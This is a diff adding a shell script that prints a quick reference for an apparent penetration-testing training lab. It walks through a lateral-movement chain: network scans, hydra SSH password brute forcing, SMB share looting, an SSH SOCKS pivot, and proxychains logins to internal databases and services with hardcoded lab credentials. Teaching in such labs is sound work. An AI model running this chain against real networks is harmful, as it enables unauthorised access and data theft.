@@ -1,0 +1,38 @@
+#!/bin/sh
+# Lateral Movement — quick reference, shown by the `labhelp` command. These are
+# the REAL commands the LAB-GUIDE walks through; nothing here is a lab-only verb.
+HN="$(hostname)"
+cat <<EOF
+
+  LATERAL MOVEMENT — attack chain                 (you are on: $HN)
+  ------------------------------------------------------------------
+
+  MISSION
+    secutils (172.20.1.10) sits on corp only. The internal segment
+    (172.20.2.0/24) is unreachable until you pivot through the dual-homed
+    workstation. Scan → foothold → pivot → loot.
+
+  PHASE 1 — SCAN THE CORP SEGMENT (all you can see for now):
+    nmap -sn 172.20.1.0/24                     sweep corp for live hosts  (alias: scan)
+    nmap -sV 172.20.1.20                       fingerprint the workstation (SSH + SMB)
+    nmap -Pn 172.20.2.40                       proof it fails — no route to internal yet
+
+  PHASE 2 — GET A FOOTHOLD ON THE WORKSTATION:
+    hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/pass.txt ssh://172.20.1.20
+    ssh labuser@172.20.1.20                    log in once hydra finds a password
+    smbclient -L //172.20.1.20 -N             (Door B) loot the open Samba share
+
+  PHASE 3/4 — PIVOT: open a SOCKS tunnel through the workstation, leave it running:
+    ssh -D 1080 labuser@172.20.1.20            SOCKS proxy on localhost:1080
+    proxychains nmap -sT -Pn 172.20.2.0/24     now scan internal THROUGH the pivot  (alias: pnmap)
+
+  PHASE 5 — LOOT THE INTERNAL SERVICES (prefix everything with proxychains):
+    proxychains mysql -h 172.20.2.50 -u root -proot123
+    proxychains ldapsearch -x -H ldap://172.20.2.40 -D "cn=admin,dc=corp,dc=local" -w admin123 -b "dc=corp,dc=local"
+    proxychains telnet 172.20.2.60             cleartext login (telnetuser / Telnet123)
+    proxychains ssh developer@172.20.2.30      the second workstation (Dev2023!)
+
+  Type  netmap  for the network diagram.
+  Full guide:  LAB-GUIDE.md   ·   Browser targets: http://localhost:3000 (juice) / :8080 (dvwa)
+
+EOF
